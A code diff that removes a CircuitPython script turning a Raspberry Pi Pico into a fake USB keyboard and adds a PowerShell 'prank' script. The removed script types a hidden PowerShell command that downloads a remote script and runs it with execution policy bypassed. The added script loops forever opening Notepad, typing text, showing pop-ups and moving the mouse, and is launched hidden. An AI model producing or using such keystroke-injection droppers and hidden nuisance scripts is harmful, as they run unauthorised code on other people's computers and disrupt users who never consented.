@@ -1,47 +1,50 @@
-# code.py  (CircuitPython on Pico)
-import time
-import usb_hid
-from adafruit_hid.keyboard import Keyboard
-from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
-from adafruit_hid.keycode import Keycode
+# prank.ps1
+# ----------------------------
+# Harmless “troll” script for Windows: opens Notepad, shows pop-ups, and moves the mouse randomly.
+# Save this as prank.ps1 and launch with:
+#   powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\Users\Public\prank.ps1"
+# ----------------------------
 
-# -----------------------------------------------
-# CONFIGURATION
-# -----------------------------------------------
-RAW_URL = "https://raw.githubusercontent.com/yourusername/PranksRepo/main/prank.ps1"
-SAVE_PATH = r"C:\Users\Public\prank.ps1"   # Where to save the downloaded script
-DELAY_BEFORE_START = 2    # Seconds to wait after plug-in
-# -----------------------------------------------
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
 
-kbd = Keyboard(usb_hid.devices)
-layout = KeyboardLayoutUS(kbd)
+function Show-RandomPopup {
+    $titles   = @("Hey there!", "Surprise!", "Gotcha!", "👻 Boo!")
+    $messages = @(
+        "Your PC is haunted... 👻",
+        "Did you really do this?",
+        "I see you typing...",
+        "You shouldn't have clicked that!"
+    )
+    $rndTitle   = $titles   | Get-Random
+    $rndMessage = $messages | Get-Random
 
-def fast_type(text, char_delay=0.01):
-    for c in text:
-        layout.write(c)
-        time.sleep(char_delay)
+    [System.Windows.Forms.MessageBox]::Show(
+        $rndMessage,
+        $rndTitle,
+        [System.Windows.Forms.MessageBoxButtons]::OK,
+        [System.Windows.Forms.MessageBoxIcon]::Information
+    )
+}
 
-time.sleep(DELAY_BEFORE_START)  # Give Windows time to enumerate
+while ($true) {
+    $np = Start-Process -FilePath "notepad.exe" -PassThru
+    Start-Sleep -Milliseconds 500
 
-# 1) Open Win+R to run PowerShell (to download the script):
-kbd.send(Keycode.GUI, Keycode.R)
-time.sleep(0.5)
+    [System.Windows.Forms.SendKeys]::SendWait("Hello from Pico!{ENTER}This is just a friendly prank...{ENTER}")
 
-# Build a single-line PowerShell command that:
-#  • uses Invoke-WebRequest to fetch RAW_URL → SAVE_PATH
-#  • then starts that file in hidden mode
-ps_cmd = (
-    f'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command '
-    f'"Invoke-WebRequest -Uri \\"{RAW_URL}\\" -OutFile \\"{SAVE_PATH}\\"; '
-    f'Start-Process -FilePath \\"powershell.exe\\" -ArgumentList '
-    f'\\"-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File {SAVE_PATH}\\""'
-)
+    Start-Sleep -Seconds 2
 
-# Type that full command into the Run dialog
-fast_type(ps_cmd)
-time.sleep(0.2)
-kbd.send(Keycode.ENTER)
+    Show-RandomPopup
 
-# 2) Prevent any further keystrokes
-while True:
-    time.sleep(1)
+    Start-Sleep -Milliseconds (Get-Random -Minimum 800 -Maximum 1600)
+
+    $screenWidth  = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
+    $screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
+    $rndX = Get-Random -Minimum 0 -Maximum $screenWidth
+    $rndY = Get-Random -Minimum 0 -Maximum $screenHeight
+    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($rndX, $rndY)
+
+    Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3)
+}
+'''
